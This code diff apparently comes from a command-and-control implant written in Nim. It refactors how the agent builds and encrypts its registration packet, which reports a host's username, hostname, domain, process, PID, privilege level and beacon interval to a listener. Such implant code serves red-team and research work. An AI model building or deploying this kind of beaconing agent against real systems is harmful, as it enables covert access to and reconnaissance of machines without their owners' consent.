@@ -192,7 +192,7 @@ proc getOSVersion(): string =
     else:
         return "Unknown"
 
-proc collectAgentMetadata*(config: AgentConfig): AgentRegistrationData = 
+proc collectAgentMetadata*(ctx: AgentCtx): AgentRegistrationData = 
     
     return AgentRegistrationData(
         header: Header(
@@ -201,14 +201,14 @@ proc collectAgentMetadata*(config: AgentConfig): AgentRegistrationData =
             packetType: cast[uint8](MSG_REGISTER),
             flags: cast[uint16](FLAG_ENCRYPTED),
             size: 0'u32,
-            agentId: uuidToUint32(config.agentId),
-            seqNr: nextSequence(uuidToUint32(config.agentId)),                              
+            agentId: uuidToUint32(ctx.agentId),
+            seqNr: nextSequence(uuidToUint32(ctx.agentId)),                              
             iv: generateIV(),
             gmac: default(AuthenticationTag)
         ), 
-        agentPublicKey: config.agentPublicKey,
+        agentPublicKey: ctx.agentPublicKey,
         metadata: AgentMetadata(
-            listenerId: uuidToUint32(config.listenerId),
+            listenerId: uuidToUint32(ctx.listenerId),
             username: string.toBytes(getUsername()),
             hostname: string.toBytes(getHostname()),
             domain: string.toBytes(getDomain()),
@@ -217,11 +217,11 @@ proc collectAgentMetadata*(config: AgentConfig): AgentRegistrationData =
             process: string.toBytes(getProcessExe()),
             pid: cast[uint32](getProcessId()),
             isElevated: cast[uint8](isElevated()),
-            sleep: cast[uint32](config.sleep)
+            sleep: cast[uint32](ctx.sleep)
         )
     )
 
-proc serializeRegistrationData*(config: AgentConfig, data: var AgentRegistrationData): seq[byte] = 
+proc serializeRegistrationData*(ctx: AgentCtx, data: var AgentRegistrationData): seq[byte] = 
 
     var packer = Packer.init()
 
@@ -242,7 +242,7 @@ proc serializeRegistrationData*(config: AgentConfig, data: var AgentRegistration
     packer.reset()
 
     # Encrypt metadata
-    let (encData, gmac) = encrypt(config.sessionKey, data.header.iv, metadata, data.header.seqNr)
+    let (encData, gmac) = encrypt(ctx.sessionKey, data.header.iv, metadata, data.header.seqNr)
 
     # Set authentication tag (GMAC)
     data.header.gmac = gmac
